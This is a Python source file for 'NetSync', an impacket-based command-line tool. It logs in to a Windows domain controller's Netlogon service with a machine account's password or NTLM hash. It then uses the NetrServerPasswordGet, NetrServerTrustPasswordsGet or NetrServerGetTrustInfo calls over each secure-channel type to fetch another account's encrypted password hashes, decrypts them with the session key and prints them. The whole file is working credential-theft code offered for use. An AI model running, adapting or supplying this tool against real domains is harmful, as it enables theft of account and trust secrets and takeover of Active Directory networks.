#!/usr/bin/env python
import sys
import argparse
import logging
import re
from dns import resolver
from binascii import unhexlify, hexlify

from impacket.examples import logger
from impacket import version
from impacket.dcerpc.v5 import epm
from impacket.crypto import SamDecryptNTLMHash
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_NETLOGON
from impacket.examples.utils import parse_target
from impacket.krb5.keytab import Keytab

from libs import nrpc
from libs import transport

LOGO = r"""
  _   _      _   ____                   
 | \ | | ___| |_/ ___| _   _ _ __   ___ 
 |  \| |/ _ \ __\___ \| | | | '_ \ / __|
 | |\  |  __/ |_ ___) | |_| | | | | (__ 
 |_| \_|\___|\__|____/ \__, |_| |_|\___|
                       |___/            
"""

class Hostname2Ip:
    def __init__(self):
        self.dnsresolver = resolver.Resolver()

    def host2ip(self, hostname, nameserver, dns_timeout=3,dns_tcp=True):
        if nameserver:
             self.dnsresolver.nameservers = [nameserver]
        self.dnsresolver.lifetime = float(dns_timeout)
        try:
            q = self.dnsresolver.resolve(hostname, 'A', tcp=dns_tcp)
            for r in q:
                addr = r.address
            logging.info('HostName: {} -> Resolved: {}'.format(hostname, addr))
            return addr
        except Exception as e:
            # logging.error("Resolved Failed: %s" % e)
            return None
        
class NrpcNegotiateFlags:
    None_ = 0
    SupportsRC4 = 0x4
    DoesNotRequireValidationLevel2 = 0x40
    SupportsRefusePasswordChange = 0x100
    SupportsNetrLogonSendToSam = 0x200
    SupportsGenericPassThroughAuthentication = 0x400
    SupportsConcurrentRpcCalls = 0x800
    SupportsStrongKeys = 0x4000
    SupportsTransitiveTrusts = 0x8000
    SupportsNetrServerPasswordSet2 = 0x20000
    SupportsNetrLogonGetDomainInfo = 0x40000
    SupportsCrossForestTrusts = 0x80000
    SupportsWinNT4Emulation = 0x100000
    SupportsRodcPassThroughToDifferentDomains = 0x200000
    SupportsAESAndSHA2 = 0x1000000
    SupportsSecureRpc = 0x40000000

    def get_supported_abilities(capabilities):
        flags_to_ability = {
            NrpcNegotiateFlags.SupportsRC4: "SupportsRC4",
            NrpcNegotiateFlags.DoesNotRequireValidationLevel2: "DoesNotRequireValidationLevel2",
            NrpcNegotiateFlags.SupportsRefusePasswordChange: "SupportsRefusePasswordChange",
            NrpcNegotiateFlags.SupportsNetrLogonSendToSam: "SupportsNetrLogonSendToSam",
            NrpcNegotiateFlags.SupportsGenericPassThroughAuthentication: "SupportsGenericPassThroughAuthentication",
            NrpcNegotiateFlags.SupportsConcurrentRpcCalls: "SupportsConcurrentRpcCalls",
            NrpcNegotiateFlags.SupportsStrongKeys: "SupportsStrongKeys",
            NrpcNegotiateFlags.SupportsTransitiveTrusts: "SupportsTransitiveTrusts",
            NrpcNegotiateFlags.SupportsNetrServerPasswordSet2: "SupportsNetrServerPasswordSet2",
            NrpcNegotiateFlags.SupportsNetrLogonGetDomainInfo: "SupportsNetrLogonGetDomainInfo",
            NrpcNegotiateFlags.SupportsCrossForestTrusts: "SupportsCrossForestTrusts",
            NrpcNegotiateFlags.SupportsWinNT4Emulation: "SupportsWinNT4Emulation",
            NrpcNegotiateFlags.SupportsRodcPassThroughToDifferentDomains: "SupportsRodcPassThroughToDifferentDomains",
            NrpcNegotiateFlags.SupportsAESAndSHA2: "SupportsAESAndSHA2",
            NrpcNegotiateFlags.SupportsSecureRpc: "SupportsSecureRpc"
            
        }
        abilities = []
        # Iterate over the dictionary and check if each flag is set in capabilities
        for flag, ability in flags_to_ability.items():
            if capabilities & flag:
                abilities.append(ability)

        return abilities

class NetSync:
    def __init__(self, username='', password='', domain='', hashes=None, kdcHost=None, dcHost=None):
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__kdcHost = kdcHost
        self.__dcName = nrpc.checkNullString(dcHost)
        self.__machineUser = nrpc.checkNullString(self.__username)
        self.__machineName = self.__username.rstrip('$')
        self.__dce = None
        self.__aesandsha = False
        logging.info("Using domain controller: {} for domain {}".format(self.__dcName, self.__domain))
        

        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')

        if not self.check_auth():
            sys.exit(1)

    def check_auth(self):
        try:
            self.authenticate()
            resp = nrpc.hNetrLogonGetCapabilities(self.__dce, self.__dcName, self.__machineName, self.update_authenticator(),0)
            # resp.dump()
            capabilities = resp['ServerCapabilities']['ServerCapabilities']
            logging.info("Capabilities: {}".format(capabilities))
            abilities = NrpcNegotiateFlags.get_supported_abilities(capabilities)
            support_str = ", ".join(abilities)
            logging.info("Authenticated successfully! have these capabilities: {}".format(support_str))
            return True
        except Exception as e:
            logging.error(str(e))
        return False

    def authenticate(self):
        stringbinding = epm.hept_map(self.__kdcHost, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
        rpctransport = transport.DCERPCTransportFactory(stringbinding)
        if hasattr(rpctransport, 'set_credentials'):
            # This method exists only for selected protocol sequences.
            rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                                         '')
        dce = rpctransport.get_dce_rpc()
        dce.set_credentials(*rpctransport.get_credentials())
        dce.connect()
        dce.bind(nrpc.MSRPC_UUID_NRPC)
        if not self.NetrServerAuthenticate(dce):
            logging.error("Failed to authenticate to the domain controller.")
            sys.exit(1)
    
    def update_authenticator(self):
        if self.__aesandsha:
            auth = nrpc.ComputeNetlogonAuthenticatorAES(self.clientStoredCredential, self.sessionKey)
        else:
            auth = nrpc.ComputeNetlogonAuthenticator(self.clientStoredCredential, self.sessionKey)
        return auth
    

    def NetrServerAuthenticate(self, dce):
        try:
            # impacket not support NrpcNegotiateFlags.SupportsAESAndSHA2 yet, fuck it.
            negotiateFlags =  NrpcNegotiateFlags.DoesNotRequireValidationLevel2 | NrpcNegotiateFlags.SupportsConcurrentRpcCalls  | NrpcNegotiateFlags.SupportsCrossForestTrusts | NrpcNegotiateFlags.SupportsGenericPassThroughAuthentication | NrpcNegotiateFlags.SupportsNetrLogonGetDomainInfo | NrpcNegotiateFlags.SupportsNetrLogonSendToSam | NrpcNegotiateFlags.SupportsNetrServerPasswordSet2 | NrpcNegotiateFlags.SupportsRC4 | NrpcNegotiateFlags.SupportsRefusePasswordChange | NrpcNegotiateFlags.SupportsRodcPassThroughToDifferentDomains | NrpcNegotiateFlags.SupportsSecureRpc| NrpcNegotiateFlags.SupportsStrongKeys  | NrpcNegotiateFlags.SupportsTransitiveTrusts
            clientChallenge = b'12345678'
            resp = nrpc.hNetrServerReqChallenge(dce, self.__dcName, self.__machineName , clientChallenge)
            serverChallenge = resp['ServerChallenge']
            bnthash = unhexlify(self.__nthash) or None
            logging.debug("Server Challenge: %s" % hexlify(serverChallenge).decode('utf-8'))
            if negotiateFlags & NrpcNegotiateFlags.SupportsAESAndSHA2 == NrpcNegotiateFlags.SupportsAESAndSHA2:
                logging.debug("Using AES key")
                self.__aesandsha = True
                self.sessionKey = nrpc.ComputeSessionKeyAES('', clientChallenge, serverChallenge, bnthash)
                self.clientStoredCredential = nrpc.ComputeNetlogonCredentialAES(clientChallenge, self.sessionKey)
            elif negotiateFlags & NrpcNegotiateFlags.SupportsStrongKeys == NrpcNegotiateFlags.SupportsStrongKeys:  
                logging.debug("Using strong key")
                self.__aesandsha = False
                self.sessionKey = nrpc.ComputeSessionKeyStrongKey('', clientChallenge, serverChallenge, bnthash)
                self.clientStoredCredential = nrpc.ComputeNetlogonCredential(clientChallenge, self.sessionKey)
            else:
                logging.error("No supported key type found.")
                return False
            resp = nrpc.hNetrServerAuthenticate3(dce, self.__dcName, self.__machineUser,
                                                nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
                                                self.__machineName, self.clientStoredCredential, negotiateFlags)
            # resp.dump()
            # nrpc.hNetrServerAuthenticate2(dce, self.__dcName, self.__machineUser,
            #                               nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
            #                               self.__machineUser, self.clientStoredCredential, 0x600FFFFF)
        except nrpc.DCERPCSessionError as e:
            logging.error(str(e))
            return False
        except Exception as e:
            logging.error(str(e))
            return False
        dce.set_auth_type(RPC_C_AUTHN_NETLOGON)
        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        dce2 = dce.alter_ctx(nrpc.MSRPC_UUID_NRPC)
        dce2.set_session_key(self.sessionKey, self.__aesandsha)
        self.__dce = dce2
        return True


    def dcryptHash(self, resp, type=None):
        if type == "NetrServerPasswordGet":
            encrypt_hash = resp['EncryptedNtOwfPassword']
            logging.debug('EncryptedNtOwfPassword: %s' % encrypt_hash)
            decrypt_hash = SamDecryptNTLMHash(encrypt_hash, self.sessionKey)
            logging.info("Decrypt Hash: %s" % hexlify(decrypt_hash).decode('utf-8'))
        else:
            encrypt_old_hash = resp['EncryptedOldOwfPassword']
            encrypt_new_hash = resp['EncryptedNewOwfPassword']
            logging.debug('EncryptedOldOwfPassword: %s' % encrypt_old_hash)
            logging.debug('EncryptedNewOwfPassword: %s' % encrypt_new_hash)
            decrypt_old_hash = SamDecryptNTLMHash(encrypt_old_hash, self.sessionKey)
            decrypt_new_hash = SamDecryptNTLMHash(encrypt_new_hash, self.sessionKey)
            logging.info("Decrypt Old Hash: %s" % hexlify(decrypt_old_hash).decode('utf-8'))
            logging.info("Decrypt New Hash: %s" % hexlify(decrypt_new_hash).decode('utf-8'))


    def dump(self, target, type=None):
        logging.info("Tring to sync password for {} using credentials for {}".format(target, self.__machineUser))
        # need check the user UAC for current channel, currently not implemented.
        all_channel = [nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel, nrpc.NETLOGON_SECURE_CHANNEL_TYPE.WorkstationSecureChannel, nrpc.NETLOGON_SECURE_CHANNEL_TYPE.TrustedDomainSecureChannel, nrpc.NETLOGON_SECURE_CHANNEL_TYPE.CdcServerSecureChannel]
        for channel in all_channel:
            logging.debug("Try to get hash with channel: %s" % nrpc.NETLOGON_SECURE_CHANNEL_TYPE.enumItems(channel).name)
            try:
                self.NetrServerAuthenticate(self.__dce)
                if type == "NetrServerPasswordGet":
                    resp = nrpc.hNetrServerPasswordGet(self.__dce, self.__dcName, target, channel, self.__machineName, self.update_authenticator())
                elif type == "NetrServerTrustPasswordsGet":
                    resp = nrpc.hNetrServerTrustPasswordsGet(self.__dce, self.__dcName, target, channel, self.__machineName, self.update_authenticator())
                else:
                    resp = nrpc.hNetrServerGetTrustInfo(self.__dce, self.__dcName, target, channel, self.__machineName, self.update_authenticator())
                self.dcryptHash(resp, type)
                break
            except nrpc.DCERPCSessionError as e:
                if str(e).find("STATUS_NO_SUCH_USER") > 0:
                    logging.error("No such user: %s with channel: %s" % (target, nrpc.NETLOGON_SECURE_CHANNEL_TYPE.enumItems(channel).name))
                else:
                    logging.error(str(e))
                continue
            except Exception as e:
                logging.error(str(e))
                continue
        self.__dce.disconnect()


# Process command-line arguments.
if __name__ == '__main__':
    print(LOGO)
    parser = argparse.ArgumentParser()
    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName>')
    parser.add_argument('-a', "--account", action='store', help='Account name to dump hash.', required=True)
    parser.add_argument('-m','--method', action='store', choices=['NetrServerPasswordGet', 'NetrServerTrustPasswordsGet', 'NetrServerGetTrustInfo'], default='NetrServerGetTrustInfo', help='Method to dump hash.')
    parser.add_argument('-ns', action='store', help='Nameserver to resolve targetName')
    parser.add_argument('-ts', action='store_true', help='adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')


    group = parser.add_argument_group('authentication')
    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller. '
                                         'If omitted it will use the domain part (FQDN) specified in the target parameter')
    group.add_argument('-keytab', action="store", help='Read keys for SPN from keytab file')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    # Init the example's logger theme
    logger.init(options.ts)

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    domain, username, password, address = parse_target(options.target)

    # mack sure address is FQDN targetName and not IP
    if re.match(r"^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$", address):
        logging.error("Please provide FQDN targetName.")
        sys.exit(1)
    
    if domain not in address:
        address = "{}.{}".format(address, domain)

    if domain is None:
        domain = ''

    if "$" not in username:
        logging.error("Please provide machine account name.")
        sys.exit(1)

    if options.keytab is not None:
        Keytab.loadKeysFromKeytab (options.keytab, username, domain, options)
        options.k = True

    if password == '' and username != '' and options.hashes is None:
        from getpass import getpass

        password = getpass("Password:")

    if options.dc_ip is None:
        res = Hostname2Ip()
        addr = res.host2ip(address, options.ns)
        if addr is None:
            logging.error("Failed to resolve targetName: %s" % address)
            sys.exit(1)
        options.dc_ip = addr

    # abilities = NrpcNegotiateFlags.get_supported_abilities(0x212FFFFF)
    # support_str = ", ".join(abilities)
    # logging.info("capabilities: {}".format(support_str))
    sync = NetSync(username, password, domain, options.hashes, options.dc_ip, address)
    sync.dump(options.account, type=options.method)
